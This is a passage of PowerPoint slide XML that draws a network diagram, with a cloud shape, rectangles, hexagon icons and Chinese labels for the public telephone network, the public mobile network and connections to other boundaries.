                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="884" y="48"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="872" y="50"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="860" y="53"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="848" y="57"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="837" y="61"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="826" y="67"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="818" y="63"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="809" y="61"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="799" y="60"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="787" y="61"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="776" y="65"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="766" y="71"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="757" y="79"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="750" y="88"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="745" y="79"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="739" y="70"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="732" y="62"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="724" y="55"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="716" y="48"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="707" y="42"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="697" y="38"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="687" y="34"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="676" y="31"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="665" y="29"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="654" y="29"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="642" y="29"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="631" y="31"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="621" y="34"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="610" y="38"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="600" y="43"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="591" y="49"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="583" y="56"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="575" y="64"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="567" y="57"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="558" y="50"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="549" y="44"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="539" y="38"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="529" y="33"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="519" y="29"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="508" y="25"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="498" y="22"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="487" y="19"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="475" y="18"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="464" y="17"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="452" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="441" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="430" y="17"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="419" y="19"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="409" y="21"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="399" y="24"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="389" y="27"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="379" y="31"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="369" y="36"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="360" y="41"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="351" y="46"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="343" y="52"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="335" y="59"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="328" y="50"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="321" y="42"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="313" y="35"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="304" y="28"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="295" y="22"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="286" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="276" y="11"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="266" y="8"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="255" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="244" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="233" y="1"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="221" y="0"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="210" y="1"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="199" y="2"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="188" y="4"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="178" y="7"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="168" y="11"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="158" y="16"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="149" y="21"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="140" y="27"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="132" y="33"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="124" y="40"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="117" y="48"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="110" y="56"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="100" y="50"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="89" y="46"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="76" y="44"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="66" y="45"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="56" y="48"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="47" y="52"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="40" y="58"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="33" y="65"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="27" y="72"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="23" y="81"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="91"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="19" y="101"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="20" y="112"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="24" y="123"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="28" y="132"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="35" y="140"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="43" y="147"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="52" y="152"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="62" y="156"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="55" y="165"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="50" y="174"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="44" y="184"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="41" y="194"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="37" y="205"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="36" y="216"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="35" y="227"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="35" y="230"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="35" y="234"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="36" y="236"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="29" y="246"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="23" y="255"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="18" y="265"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="14" y="276"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="10" y="286"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="6" y="297"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="309"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="2" y="320"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1" y="332"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="0" y="344"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1" y="355"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="2" y="367"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="4" y="378"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="6" y="389"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="9" y="399"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="13" y="410"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="17" y="420"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="22" y="429"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="27" y="439"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="33" y="448"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="39" y="456"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="46" y="464"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="40" y="479"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="36" y="495"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="35" y="511"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="36" y="521"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="37" y="532"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="39" y="541"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="43" y="551"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="47" y="560"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="51" y="568"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="57" y="576"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="63" y="583"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="70" y="590"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="78" y="597"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="85" y="602"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="94" y="607"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="103" y="611"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="112" y="614"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="122" y="617"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="132" y="618"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="142" y="618"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="155" y="618"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="167" y="616"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="179" y="612"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="190" y="607"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="197" y="615"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="205" y="622"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="214" y="628"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="223" y="634"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="232" y="638"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="243" y="642"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="253" y="645"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="264" y="646"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="275" y="647"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="286" y="646"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="297" y="645"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="307" y="642"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="318" y="638"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="327" y="634"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="336" y="628"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="345" y="622"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="352" y="615"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="360" y="608"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="366" y="599"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="377" y="603"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="387" y="606"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="398" y="609"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="410" y="611"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="421" y="612"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="433" y="612"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="444" y="612"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="455" y="611"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="466" y="609"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="476" y="607"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="486" y="604"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="496" y="601"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="506" y="597"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="515" y="593"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="524" y="588"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="533" y="582"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="541" y="577"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="549" y="570"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="557" y="563"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="565" y="557"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="567" y="566"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="570" y="576"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="574" y="585"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="579" y="593"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="584" y="601"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="591" y="609"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="597" y="616"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="605" y="622"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="613" y="627"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="621" y="632"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="630" y="636"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="640" y="639"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="649" y="642"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="659" y="643"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="670" y="644"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="681" y="643"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="692" y="641"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="703" y="638"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="713" y="634"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="723" y="629"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="732" y="623"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="741" y="617"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="749" y="609"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="764" y="612"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="780" y="615"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="796" y="615"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="808" y="615"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="819" y="614"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="830" y="612"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="841" y="610"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="852" y="607"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="862" y="603"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="872" y="599"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="882" y="594"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="891" y="601"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="900" y="607"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="910" y="612"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="920" y="616"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="931" y="619"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="942" y="621"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="954" y="621"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="967" y="621"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="979" y="619"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="990" y="615"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1001" y="611"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1012" y="605"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1021" y="598"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1030" y="590"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1038" y="598"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1047" y="606"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1056" y="612"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1066" y="618"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1077" y="622"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1088" y="625"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1100" y="627"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1112" y="628"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1125" y="627"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1137" y="625"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1149" y="621"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1161" y="616"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1171" y="610"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1180" y="620"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1191" y="627"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1204" y="632"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1217" y="634"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1228" y="633"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1237" y="630"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1246" y="626"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1254" y="620"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1261" y="613"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1266" y="606"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1271" y="597"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1273" y="587"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1274" y="577"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1272" y="562"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1267" y="549"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1259" y="538"/>
                    </a:lnTo>
                    <a:lnTo>
                      <a:pt x="1248" y="529"/>
                    </a:lnTo>
                    <a:close/>
                  </a:path>
                </a:pathLst>
              </a:custGeom>
              <a:solidFill>
                <a:srgbClr val="CCFFCC"/>
              </a:solidFill>
              <a:ln>
                <a:noFill/>
              </a:ln>
              <a:extLst>
                <a:ext uri="{91240B29-F687-4F45-9708-019B960494DF}">
                  <a14:hiddenLine xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main" w="6350">
                    <a:solidFill>
                      <a:srgbClr val="000000"/>
                    </a:solidFill>
                    <a:round/>
                    <a:headEnd/>
                    <a:tailEnd/>
                  </a14:hiddenLine>
                </a:ext>
              </a:extLst>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="zh-CN" altLang="en-US"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="98474" name="Text Box 76"/>
              <p:cNvSpPr txBox="1">
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="3974" y="2464"/>
                <a:ext cx="78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1600" b="1" dirty="0"/>
                  <a:t>公共电话网</a:t>
                </a:r>
              </a:p>
              <a:p>
                <a:pPr algn="ctr"/>
                <a:r>
                  <a:rPr lang="zh-CN" altLang="en-US" sz="1600" b="1" dirty="0"/>
                  <a:t>公共移动网</a:t>
                </a:r>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98336" name="Rectangle 77"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="427" y="1389"/>
              <a:ext cx="1125" cy="602"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="127000" cmpd="dbl">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p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98337" name="Freeform 78"/>
            <p:cNvSpPr>
              <a:spLocks/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="1359" y="2297"/>
              <a:ext cx="186" cy="305"/>
            </a:xfrm>
            <a:custGeom>
              <a:avLst/>
              <a:gdLst>
                <a:gd name="T0" fmla="*/ 2147483647 w 59"/>
                <a:gd name="T1" fmla="*/ 0 h 128"/>
                <a:gd name="T2" fmla="*/ 0 w 59"/>
                <a:gd name="T3" fmla="*/ 0 h 128"/>
                <a:gd name="T4" fmla="*/ 0 w 59"/>
                <a:gd name="T5" fmla="*/ 2147483647 h 128"/>
                <a:gd name="T6" fmla="*/ 2147483647 w 59"/>
                <a:gd name="T7" fmla="*/ 2147483647 h 128"/>
                <a:gd name="T8" fmla="*/ 0 60000 65536"/>
                <a:gd name="T9" fmla="*/ 0 60000 65536"/>
                <a:gd name="T10" fmla="*/ 0 60000 65536"/>
                <a:gd name="T11" fmla="*/ 0 60000 65536"/>
                <a:gd name="T12" fmla="*/ 0 w 59"/>
                <a:gd name="T13" fmla="*/ 0 h 128"/>
                <a:gd name="T14" fmla="*/ 59 w 59"/>
                <a:gd name="T15" fmla="*/ 128 h 128"/>
              </a:gdLst>
              <a:ahLst/>
              <a:cxnLst>
                <a:cxn ang="T8">
                  <a:pos x="T0" y="T1"/>
                </a:cxn>
                <a:cxn ang="T9">
                  <a:pos x="T2" y="T3"/>
                </a:cxn>
                <a:cxn ang="T10">
                  <a:pos x="T4" y="T5"/>
                </a:cxn>
                <a:cxn ang="T11">
                  <a:pos x="T6" y="T7"/>
                </a:cxn>
              </a:cxnLst>
              <a:rect l="T12" t="T13" r="T14" b="T15"/>
              <a:pathLst>
                <a:path w="59" h="128">
                  <a:moveTo>
                    <a:pt x="54" y="0"/>
                  </a:moveTo>
                  <a:lnTo>
                    <a:pt x="0" y="0"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="0" y="128"/>
                  </a:lnTo>
                  <a:lnTo>
                    <a:pt x="59" y="128"/>
                  </a:lnTo>
                </a:path>
              </a:pathLst>
            </a:custGeom>
            <a:noFill/>
            <a:ln w="19050">
              <a:solidFill>
                <a:srgbClr val="A5002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38" name="Rectangle 79"/>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm>
              <a:off x="427" y="2168"/>
              <a:ext cx="1125" cy="602"/>
            </a:xfrm>
            <a:prstGeom prst="rect">
              <a:avLst/>
            </a:prstGeom>
            <a:noFill/>
            <a:ln w="127000" cmpd="dbl">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p>
          </p:txBody>
        </p:sp>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="98339" name="Text Box 80"/>
            <p:cNvSpPr txBox="1">
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="auto">
            <a:xfrm rot="5400000">
              <a:off x="4902" y="1859"/>
              <a:ext cx="1304"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1600" b="1"/>
                <a:t>连 接 至 其 他 边 界</a:t>
              </a:r>
            </a:p>
          </p:txBody>
        </p:sp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="98340" name="Group 81"/>
            <p:cNvGrpSpPr>
              <a:grpSpLocks/>
            </p:cNvGrpSpPr>
            <p:nvPr/>
          </p:nvGrpSpPr>
          <p:grpSpPr bwMode="auto">
            <a:xfrm>
              <a:off x="4146" y="3038"/>
              <a:ext cx="384" cy="355"/>
              <a:chOff x="2740" y="2246"/>
              <a:chExt cx="384" cy="373"/>
            </a:xfrm>
          </p:grpSpPr>
          <p:grpSp>
            <p:nvGrpSpPr>
              <p:cNvPr id="98456" name="Group 82"/>
              <p:cNvGrpSpPr>
                <a:grpSpLocks/>
              </p:cNvGrpSpPr>
              <p:nvPr/>
            </p:nvGrpSpPr>
            <p:grpSpPr bwMode="auto">
              <a:xfrm rot="5072917">
                <a:off x="2851" y="2347"/>
                <a:ext cx="161" cy="384"/>
                <a:chOff x="2584" y="4664"/>
                <a:chExt cx="204" cy="248"/>
              </a:xfrm>
            </p:grpSpPr>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="98469" name="AutoShape 83"/>
                <p:cNvSpPr>
                  <a:spLocks noChangeArrowheads="1"/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="auto">
                <a:xfrm>
                  <a:off x="2586" y="4712"/>
                  <a:ext cx="116" cy="100"/>
                </a:xfrm>
                <a:prstGeom prst="hexagon">
                  <a:avLst>
                    <a:gd name="adj" fmla="val 29000"/>
                    <a:gd name="vf" fmla="val 115470"/>
                  </a:avLst>
                </a:prstGeom>
                <a:solidFill>
                  <a:schemeClr val="tx2"/>
                </a:solidFill>
                <a:ln w="6350">
                  <a:solidFill>
                    <a:schemeClr val="bg2"/>
                  </a:solidFill>
                  <a:miter lim="800000"/>
                  <a:headEnd/>
                  <a:tailEnd/>
                </a:ln>
              </p:spPr>
              <p:txBody>
                <a:bodyPr rot="10800000" vert="eaVert" wrap="none" anchor="ctr"/>
                <a:lstStyle/>
                <a:p>
                  <a:endParaRPr lang="zh-CN" altLang="zh-CN"/>
                </a:p>
              </p:txBody>
            </p:sp>
            <p:sp>
              <p:nvSpPr>
                <p:cNvPr id="98470" name="AutoShape 84"/>
                <p:cNvSpPr>
                  <a:spLocks noChangeArrowheads="1"/>
                </p:cNvSpPr>
                <p:nvPr/>
              </p:nvSpPr>
              <p:spPr bwMode="auto">
                <a:xfrm>
                  <a:off x="2672" y="4764"/>
                  <a:ext cx="116" cy="100"/>
                </a:xfrm>
                <a:prstGeom prst="hexagon">
                  <a:avLst>
